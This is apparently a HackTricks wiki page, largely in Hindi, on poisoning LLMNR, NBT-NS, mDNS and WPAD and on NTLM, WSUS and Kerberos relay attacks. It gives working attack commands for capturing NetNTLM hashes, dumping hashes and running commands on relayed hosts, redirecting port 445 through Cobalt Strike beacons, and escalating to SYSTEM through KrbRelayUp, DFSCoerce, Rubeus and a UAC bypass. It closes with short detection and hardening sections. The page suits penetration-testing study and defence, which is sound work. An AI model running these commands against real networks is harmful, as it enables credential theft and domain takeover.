# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Network Protocols

### Local Host Resolution Protocols

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft और अन्य ऑपरेटिंग सिस्टम DNS विफल होने पर स्थानीय नाम रिज़ॉल्यूशन के लिए LLMNR और NBT-NS का उपयोग करते हैं। इसी तरह, Apple और Linux सिस्टम mDNS का उपयोग करते हैं।
- ये प्रोटोकॉल बिना प्रमाणीकृत, ब्रॉडकास्ट प्रकृति के कारण UDP पर interception और spoofing के प्रति संवेदनशील हैं।
- [Responder](https://github.com/lgandx/Responder) और [Dementor](https://github.com/MatrixEditor/Dementor) का उपयोग उन होस्ट्स को forged responses भेजकर सर्विसेस की impersonate करने के लिए किया जा सकता है जो इन प्रोटोकॉल्स पर query कर रहे हों।
- Responder का उपयोग करके सर्विस impersonation के बारे में और जानकारी [here](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) प्राप्त की जा सकती है।

### Web Proxy Auto-Discovery Protocol (WPAD)

- WPAD ब्राउज़र्स को proxy सेटिंग्स स्वतः खोजने की अनुमति देता है।
- डिस्कवरी DHCP, DNS के माध्यम से होती है, या DNS विफल होने पर fallback के रूप में LLMNR और NBT-NS का उपयोग होता है।
- Responder WPAD attacks को automate कर सकता है, क्लाइंट्स को malicious WPAD सर्वरों की ओर निर्देशित करके।

### Responder/Dementor for Protocol Poisoning

- **Responder** एक टूल है जो LLMNR, NBT-NS, और mDNS क्वेरीज़ को poison करने के लिए उपयोग किया जाता है, क्वेरी प्रकारों के आधार पर selective responses भेजता है, मुख्यतः SMB सेवाओं को लक्ष्य बनाकर।
- यह Kali Linux में पहले से इंस्टॉल आता है, और `/etc/responder/Responder.conf` पर कॉन्फ़िगर किया जा सकता है।
- Responder कैप्चर किए गए hashes को स्क्रीन पर दिखाता है और उन्हें `/usr/share/responder/logs` डायरेक्टरी में सेव करता है।
- यह IPv4 और IPv6 दोनों को सपोर्ट करता है।
- Windows वर्ज़न ऑफ Responder यहाँ उपलब्ध है: [here](https://github.com/lgandx/Responder-Windows).

- **Dementor** multicast poisoning के विषयों का विस्तार करता है और अतिरिक्त रूप से एक rogue service provider के रूप में कार्य करता है (CUPS RCE सपोर्ट सहित)।
- इसकी कुल संरचना **Responder** जैसी है लेकिन अधिक granular configuration प्रदान करती है। (default यहाँ है: [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
- **Dementor** और **Responder** के बीच compatibility यहाँ दी गई है: [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- Intro और Documentation यहाँ: [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- कुछ प्रोटोकॉल्स पर Responder द्वारा पेश की गई capture issues को ठीक करता है

#### Running Responder

- Responder को default settings के साथ चलाने के लिए: `responder -I <Interface>`
- अधिक aggressive probing के लिए (जिसके side effects हो सकते हैं): `responder -I <Interface> -P -r -v`
- NTLMv1 challenges/responses को capture करने की तकनीकें (cracking आसान करने के लिए): `responder -I <Interface> --lm --disable-ess`
- WPAD impersonation को सक्रिय करने के लिए: `responder -I <Interface> --wpad`
- NetBIOS requests को attacker के IP पर resolve किया जा सकता है, और एक authentication proxy स्थापित किया जा सकता है: `responder.py -I <interface> -Pv`

#### Running Dementor

- default settings के साथ चलाने के लिए: `Dementor -I <interface>`
- analysis mode में default settings के साथ: `Dementor -I <interface> -A`
- Automatic NTLM session downgrade (ESS): `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- कस्टम config के साथ current session चलाने के लिए: `Dementor -I <interface> --config <file.toml>`

### DHCP Poisoning with Responder

- DHCP responses को spoof करके victim के routing information को स्थायी रूप से poison किया जा सकता है, जो ARP poisoning के मुकाबले अधिक stealthy विकल्प हो सकता है।
- इसके लिए target नेटवर्क के configuration का सटीक ज्ञान आवश्यक है।
- हमला चलाने का उदाहरण: `./Responder.py -I eth0 -Pdv`
- यह विधि NTLMv1/2 hashes को प्रभावी ढंग से capture कर सकती है, लेकिन नेटवर्क disruption से बचने के लिए सावधानी आवश्यक है।

### Capturing Credentials with Responder/Dementor

- Responder/Dementor उपरोक्त प्रोटोकॉल्स का उपयोग करके सेवाओं का impersonate करेगा और जब यूज़र spoofed सेवाओं के खिलाफ authenticate करने का प्रयास करेगा तो credentials (आमतौर पर NTLMv2 Challenge/Response) capture करता है।
- credentials cracking को आसान बनाने के लिए attempts किए जा सकते हैं जैसे NetNTLMv1 पर downgrade करना या ESS disable करना।

If you already have a **writable SMB share that victims browse**, you can coerce outbound SMB without spoofing by planting UNC-based lure files (SCF/LNK/library-ms/desktop.ini/Office) generated with ntlm_theft, then catching the authentication with Responder. See the [Explorer-triggered UNC lure workflow](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#writable-smb-share--explorer-triggered-unc-lures-ntlm_theftscflnklibrary-msdesktopini).

यह महत्वपूर्ण है कि इन तकनीकों का उपयोग कानूनी और एथिकल तरीके से किया जाए, उचित authorization सुनिश्चित की जाए और disruption या unauthorized access से बचा जाए।

## Inveigh

Inveigh Windows सिस्टम्स के लिए penetration testers और red teamers के लिए एक टूल है। यह Responder के समान functionalities प्रदान करता है, spoofing और man-in-the-middle attaques करने में सक्षम है। यह टूल एक PowerShell स्क्रिप्ट से C# बाइनरी में विकसित हुआ है, मुख्य वर्ज़न हैं [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) और [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero)। विस्तृत पैरामीटर्स और निर्देशों के लिए [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) देखें।

Inveigh को PowerShell के माध्यम से ऑपरेट किया जा सकता है:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
या C# binary के रूप में निष्पादित:
```bash
Inveigh.exe
```
### NTLM Relay Attack

यह हमला SMB authentication sessions का उपयोग करके किसी target मशीन तक पहुँच प्राप्त करता है, और सफल होने पर system shell प्रदान कर सकता है। मुख्य आवश्यकताएँ निम्नलिखित हैं:

- प्रमाणीकृत उपयोगकर्ता के पास relayed host पर Local Admin access होना चाहिए।
- SMB signing अक्षम होना चाहिए।

#### 445 Port Forwarding and Tunneling

ऐसे मामलों में जहाँ direct network introduction संभव नहीं है, पोर्ट 445 पर ट्रैफ़िक को forward और tunnel करना आवश्यक होता है। [**PortBender**](https://github.com/praetorian-inc/PortBender) जैसे टूल पोर्ट 445 के ट्रैफ़िक को किसी अन्य पोर्ट पर redirect करने में मदद करते हैं, जो तब आवश्यक है जब driver loading के लिए Local Admin access उपलब्ध हो।

PortBender setup and operation in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### NTLM Relay Attack के लिए अन्य उपकरण

- **Metasploit**: proxies, local और remote host details के साथ सेटअप करें।
- **smbrelayx**: SMB sessions relay करने, commands execute करने या backdoors deploy करने के लिए एक Python स्क्रिप्ट।
- **MultiRelay**: Responder suite का एक tool जो specific users या all users को relay करने, commands execute करने, या hashes dump करने के लिए है।

प्रत्येक tool को आवश्यक होने पर SOCKS proxy के जरिए operate करने के लिए configured किया जा सकता है, जिससे indirect network access के साथ भी attacks संभव होते हैं।

### MultiRelay ऑपरेशन

MultiRelay को _**/usr/share/responder/tools**_ directory से execute किया जाता है, जो specific IPs या users को target करता है।
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
ये उपकरण और तकनीकें विभिन्न नेटवर्क वातावरणों में NTLM Relay हमलों को अंजाम देने के लिए एक व्यापक सेट बनाती हैं।

### WSUS HTTP (8530) का दुरुपयोग NTLM Relay to LDAP/SMB/AD CS (ESC8) के लिए

WSUS clients अपने update server के साथ NTLM over HTTP (8530) या HTTPS (8531) के माध्यम से प्रमाणीकृत होते हैं। जब HTTP सक्षम होता है, तो स्थानीय सेगमेंट पर आवधिक क्लाइंट चेक-इन्स को जबरदस्त या इंटरसेप्ट करके ntlmrelayx के साथ LDAP/LDAPS/SMB या AD CS HTTP endpoints (ESC8) पर relay किया जा सकता है बिना किसी हैश को क्रैक किए। यह सामान्य update ट्रैफ़िक में घुल-मिल जाता है और अक्सर मशीन-खाते (HOST$) की प्रमाणीकृतियाँ देता है।

What to look for
- GPO/registry configuration under HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate and ...\WindowsUpdate\AU:
- WUServer (e.g., http://wsus.domain.local:8530)
- WUStatusServer (reporting URL)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled and DetectionFrequency (hours)
- WSUS SOAP endpoints used by clients over HTTP:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- Default ports: 8530/tcp HTTP, 8531/tcp HTTPS

Reconnaissance
- Unauthenticated
- Scan for listeners: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
- Sniff HTTP WSUS traffic via L2 MITM and log active clients/endpoints with wsusniff.py (HTTP only unless you can make clients trust your TLS cert).
- Authenticated
- Parse SYSVOL GPOs for WSUS keys with MANSPIDER + regpol (wsuspider.sh wrapper summarises WUServer/WUStatusServer/UseWUServer).
- Query endpoints at scale from hosts (NetExec) or locally:
nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

End-to-end HTTP relay steps
1) MITM के लिए पोजीशन लें (same L2) ताकि क्लाइंट WSUS सर्वर को आपके पास रिज़ॉल्व करे (ARP/DNS poisoning, Bettercap, mitm6, आदि)। arpspoof के साथ उदाहरण:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) पोर्ट 8530 को अपने relay listener पर रीडायरेक्ट करें (वैकल्पिक, सुविधाजनक):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) HTTP listener के साथ ntlmrelayx शुरू करें (HTTP listener के लिए Impacket का समर्थन चाहिए; नीचे दिए गए PRs देखें):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Other common targets:
- Relay to SMB (if signing off) for exec/dump: -t smb://<host>
- Relay to LDAPS for directory changes (e.g., RBCD): -t ldaps://<DC>
- Relay to AD CS web enrollment (ESC8) to mint a cert and then authenticate via Schannel/PKINIT:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
For deeper AD CS abuse paths and tooling, see the AD CS page:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) किसी क्लाइंट चेक-इन को ट्रिगर करें या शेड्यूल का इंतज़ार करें। क्लाइंट से:
wuauclt.exe /detectnow
or use the Windows Update UI (Check for updates).

5) प्रमाणीकृत SOCKS सेशंस (यदि -socks) या सीधे relay परिणामों का उपयोग पोस्ट-एक्सप्लॉइटेशन के लिए करें (LDAP परिवर्तन, SMB ऑप्स, या बाद में प्रमाणीकृत होने के लिए AD CS प्रमाणपत्र जारी करना)।

HTTPS constraint (8531)
- WSUS over HTTPS का पैसिव इंटरसेप्शन तब प्रभावी नहीं है जब तक क्लाइंट्स आपके सर्टिफिकेट को ट्रस्ट न करें। एक ट्रस्टेड सर्ट या अन्य TLS ब्रेक के बिना, NTLM हैंडशेक को WSUS HTTPS ट्रैफ़िक से हैरवेस्ट/रिले नहीं किया जा सकता।

Notes
- WSUS को deprecated घोषित किया गया था पर यह अभी भी व्यापक रूप से तैनात है; HTTP (8530) कई वातावरणों में अभी भी सामान्य है।
- उपयोगी सहायक उपकरण: wsusniff.py (HTTP WSUS चेक-इन्स का निरीक्षण करें), wsuspider.sh (GPOs से WUServer/WUStatusServer का एनेमेरशन), NetExec reg-query at scale.
- Impacket ने ntlmrelayx के लिए HTTP listener समर्थन PR #2034 में बहाल किया था (मूल रूप से PR #913 में जोड़ा गया था)।

### Force NTLM Logins

Windows में आप कुछ privileged accounts को arbitrary machines पर authenticate करने के लिए मजबूर कर सकते हैं। यह जानने के लिए निम्नलिखित पृष्ठ पढ़ें:

{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay attack

A **Kerberos relay attack** एक **AP-REQ ticket** चुराता है और उसे उसी कंप्यूटर-खाते की साझा कुंजी वाले दूसरे सर्विस पर पुनः उपयोग करता है (क्योंकि दोनों SPNs उसी `$` machine account पर मौजूद होते हैं)। यह तब भी काम करता है जब SPNs के **service classes अलग** हों (उदाहरण के लिए `CIFS/` → `LDAP/`) क्योंकि टिकट को डिक्रिप्ट करने वाली *कुंजी* मशीन का NT hash है, SPN स्ट्रिंग स्वयं नहीं, और SPN स्ट्रिंग signature का हिस्सा नहीं है।

NTLM relay के विपरीत, यह hop *एक ही होस्ट तक सीमित* रहता है परंतु यदि आप ऐसे प्रोटोकॉल को लक्ष्य बनाते हैं जो आपको LDAP में लिखने देते हैं, तो आप **Resource-Based Constrained Delegation (RBCD)** या **AD CS enrollment** में चेन कर सकते हैं और एक ही वार में **NT AUTHORITY\SYSTEM** प्राप्त कर सकते हैं।

इस हमले के बारे में विस्तृत जानकारी के लिए देखें:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Kerberos basics**

| Token | Purpose | Relay relevance |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | उपयोगकर्ता को KDC के समक्ष प्रमाणित करता है | अछूता |
| **Service ticket / TGS-REQ ↔ REP** | एक **SPN** से बंधा; SPN मालिक की कुंजी से एन्क्रिप्टेड | यदि SPNs उसी खाते को साझा करते हैं तो अदल-बदल योग्य |
| **AP-REQ** | क्लाइंट सेवा को `TGS` भेजता है | **जिसे हम चोरी कर रि-प्ले करते हैं** |

* टिकट्स SPN के मालिक खाते की **पासवर्ड-व्युत्पन्न कुंजी** से एन्क्रिप्ट होते हैं।
* AP-REQ के अंदर का **Authenticator** 5 मिनट का टाइमस्टैम्प रखता है; उस विंडो के अंदर रीप्ले वैध होता है जब तक सर्विस कैश डुप्लिकेट को नहीं देख लेता।
* Windows अक्सर जांचता नहीं कि टिकट में SPN स्ट्रिंग उस सेवा से मेल खाती है जिस पर आप हिट कर रहे हैं, इसलिए `CIFS/HOST` के लिए टिकट सामान्यतः `LDAP/HOST` पर ठीक से डिक्रिप्ट हो जाता है।

- 2. **Kerberos relay करने के लिए क्या सत्य होना चाहिए**

1. **Shared key:** स्रोत और लक्ष्य SPNs उसी कंप्यूटर खाते के होने चाहिए (Windows सर्वरों पर डिफ़ॉल्ट)।
2. **No channel protection:** SMB/LDAP signing बंद और HTTP/LDAPS के लिए EPA बंद।
3. **You can intercept or coerce authentication:** LLMNR/NBNS poison, DNS spoof, PetitPotam / DFSCoerce RPC, fake AuthIP, rogue DCOM, आदि।
4. **Ticket source not already used:** आपको असली पैकेट पहुँचने से पहले रेस जीतनी चाहिए या उसे पूरी तरह ब्लॉक करना चाहिए; वरना सर्वर का रिप्ले कैश Event 4649 फायर करता है।
5. आपको किसी न किसी तरह संचार में MitM करने में सक्षम होना चाहिए — संभवतः DNSAdmins समूह का हिस्सा होकर डोमेन का DNS बदलने या पीड़ित की HOST फ़ाइल बदलने में सक्षम होना चाहिए।

### Kerberos Relay Steps

- 3.1 **होस्ट की जाँच**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **relay listener शुरू करें**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** को एक ही binary में समेटता है।

- 3.3 **Coerce Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce DC को Kerberos `CIFS/DC01` टिकट हमें भेजने के लिए मजबूर करता है।

- 3.4 **Relay the AP-REQ**

KrbRelay SMB से GSS blob निकालता है, उसे एक LDAP bind में पुनः पैकेज करता है, और उसे `ldap://DC01` पर फॉरवर्ड कर देता है—authentication succeeds क्योंकि **same key** इसे decrypt कर देता है।

- 3.5 **Abuse LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
अब आपके पास **NT AUTHORITY\SYSTEM** है।


### **जानने लायक और रास्ते**

| वेक्टर | ट्रिक | क्यों महत्वपूर्ण है |
|--------|-------|--------------------|
| **AuthIP / IPSec** | नकली सर्वर किसी भी SPN के साथ **GSS-ID payload** भेजता है; क्लाइंट सीधे आपके लिए एक AP-REQ बनाता है | सबनेट्स के पार भी काम करता है; डिफ़ॉल्ट रूप से machine creds |
| **DCOM / MSRPC** | दुर्भावनापूर्ण OXID resolver क्लाइंट को किसी भी SPN और पोर्ट पर ऑथ करवाने के लिए मजबूर करता है | ख़ालिस *local* priv-esc; फ़ायरवॉल को बायपास करता है |
| **AD CS Web Enroll** | मशीन टिकट को `HTTP/CA` पर relay करके एक cert प्राप्त करें, फिर **PKINIT** से TGTs बनाएं | LDAP signing defenses को बायपास करता है |
| **Shadow Credentials** | `msDS-KeyCredentialLink` लिखें, फिर forged key pair के साथ PKINIT करें | कंप्यूटर अकाउंट जोड़ने की ज़रूरत नहीं |

### **समस्या निवारण**

| त्रुटि | मतलब | समाधान |
|-------|---------|--------|
| `KRB_AP_ERR_MODIFIED` | Ticket key ≠ target key | गलत host/SPN |
| `KRB_AP_ERR_SKEW` | क्लॉक का ऑफ़सेट > 5 मिनट | समय सिंक करें या `w32tm` का उपयोग करें |
| LDAP bind fails | Signing लागू है | AD CS path का उपयोग करें या साइनिंग डिसेबल करें |
| Event 4649 spam | सर्विस ने duplicate Authenticator देखा | मूल पैकेट को block करें या उसे race करें |


### **डिटेक्शन**

* एक ही स्रोत से सेकंडों के भीतर `CIFS/`, `HTTP/`, `LDAP/` के लिए **Event 4769** में वृद्धि।
* सर्विस पर **Event 4649** रीप्ले का पता चलने का संकेत देता है।
* **127.0.0.1** से Kerberos logon (local SCM पर relay) अत्यधिक संदिग्ध है — KrbRelayUp docs में दिए Sigma rule के जरिए मैप करें।
* `msDS-AllowedToActOnBehalfOfOtherIdentity` या `msDS-KeyCredentialLink` attributes में बदलावों पर नजर रखें।

## **हार्डनिंग**

1. हर सर्वर पर **LDAP & SMB signing + EPA** लागू करें।
2. **Split SPNs** — HTTP को CIFS/LDAP के साथ उसी अकाउंट पर न रखें।
3. coercion vectors (PetitPotam KB5005413, DFS, AuthIP) को पैच करें।
4. अवैध कंप्यूटर जॉइन रोकने के लिए **`ms-DS-MachineAccountQuota = 0`** सेट करें।
5. **Event 4649** और अनपेक्षित loopback Kerberos logons पर अलर्ट सेट करें।



## संदर्भ

- [HTB: Breach – Writable SMB share lures + Responder capture → NetNTLMv2 crack](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)

{{#include ../../banners/hacktricks-training.md}}
